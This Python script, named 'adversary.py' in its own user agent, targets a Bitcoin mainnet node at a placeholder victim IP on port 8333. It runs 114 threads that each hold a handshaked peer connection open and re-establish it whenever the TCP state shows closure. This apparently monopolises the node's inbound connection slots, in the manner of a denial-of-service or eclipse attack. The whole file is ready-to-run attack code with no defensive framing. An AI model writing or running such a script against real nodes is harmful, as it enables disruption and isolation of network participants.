from protocol import Connection, ProtocolError, ConnectionError
import socket
import struct 
import time
import random
from threading import Thread
from time import sleep

# /usr/include/netinet/tcp.h

TCP_ESTABLISHED = 1
TCP_SYN_SENT = 2
TCP_SYN_RECV = 3
TCP_FIN_WAIT1 = 4
TCP_FIN_WAIT2 = 5
TCP_TIME_WAIT = 6
TCP_CLOSE = 7
TCP_CLOSE_WAIT = 8
TCP_LAST_ACK = 9
TCP_LISTEN = 10
TCP_CLOSING = 11

TCPState = [
    "",
    "TCP_ESTABLISHED",
    "TCP_SYN_SENT",
    "TCP_SYN_RECV",
    "TCP_FIN_WAIT1",
    "TCP_FIN_WAIT2",
    "TCP_TIME_WAIT",
    "TCP_CLOSE",
    "TCP_CLOSE_WAIT",
    "TCP_LAST_ACK",
    "TCP_LISTEN",
    "TCP_CLOSING"
]

VictimPort = 8333 # mainnet default port
MyIP = "0.0.0.0" # Self IP 
VictimIP = "1.2.3.4" # modify this

# ******* DO NOT MODIFY *******
# https://stackoverflow.com/a/18189190
def getTCPInfo(s):
    fmt = "B"*7+"I"*24
    x = struct.unpack(fmt, s.getsockopt(socket.SOL_TCP, socket.TCP_INFO, 104))
    # struct tcp_info in /usr/include/linux/tcp.h
    # get tcpi_state
    return x[0]
# *****************************

def newconn():
    return Connection((VictimIP, VictimPort), # Victim IP, port
                      (MyIP, 0), # My IP
                      magic_number=b'\xF9\xBE\xB4\xD9', # Magic number in mainnet
                      socket_timeout=150, # larger than ping interval (2min)
                      proxy=None,
                      protocol_version=70016,
                      to_services=0,
                      from_services=0x409,
                      user_agent="/adversary.py:0.1/",
                      height=0,
                      relay=1)

def Conn(connid):
    while True:
        try:
            conn = newconn()
            conn.open()
            conn.handshake()
            last_ping = 0
            last_conn_time = 0
            while True:
                if time.time() > last_ping + 120:
                    try:
                        conn.ping()
                        last_ping = time.time()
                    except socket.error as err:
                        conn = newconn()
                        conn.open()
                        conn.handshake()
                        last_ping = 0
                        continue
                try:
                    conn.get_messages()
                except socket.timeout:
                    pass
                except (ProtocolError, ConnectionError, socket.error) as err:
                    conn = newconn()
                    conn.open()
                    conn.handshake()
                    last_ping = 0
                    continue
                tcpstate = getTCPInfo(conn.socket)
                assert(1<=tcpstate<=11)
                if (tcpstate == TCP_CLOSE_WAIT or
                    tcpstate == TCP_LAST_ACK or
                    tcpstate == TCP_TIME_WAIT or
                    tcpstate == TCP_CLOSING or
                    tcpstate == TCP_CLOSE):
                    conn = newconn()
                    conn.open()
                    conn.handshake()
                    last_ping = 0
                    continue
        except Exception as e:
            print(e)
            pass
        
threads = [Thread(target=Conn, args=(i,)) for i in range(114)]
for thread in threads:
    thread.start()
for thread in threads:
    thread.join()

    

